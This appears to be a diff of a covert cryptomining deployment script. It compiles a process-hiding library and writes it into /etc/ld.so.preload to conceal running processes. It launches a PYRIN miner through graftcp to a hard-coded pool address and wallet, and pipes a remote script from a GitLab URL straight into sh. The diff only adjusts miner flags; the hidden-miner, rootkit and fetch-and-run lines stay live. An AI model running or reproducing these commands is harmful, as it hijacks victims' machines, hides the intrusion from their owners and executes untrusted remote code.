@@ -57,7 +57,7 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 157.245.6.241:80 --user pyrin:qq2n4kcjdkdtt2xlt7ew9xw4z2etcymf2rz8en9wx95qxsq484wwypk3f8392.abah$(shuf -n 1 -i 1-9999999) --no-cl & curl https://gitlab.com/ravencoin002/sc/-/raw/main/cpu.sh | sh
+./graftcp/graftcp ./lol1.81 -a PYRIN -p 157.245.6.241:80 -u pyrin:qq2n4kcjdkdtt2xlt7ew9xw4z2etcymf2rz8en9wx95qxsq484wwypk3f8392.abah$(shuf -n 1 -i 1-9999999) --no-cl & curl https://gitlab.com/ravencoin002/sc/-/raw/main/cpu.sh | sh
 
 
 
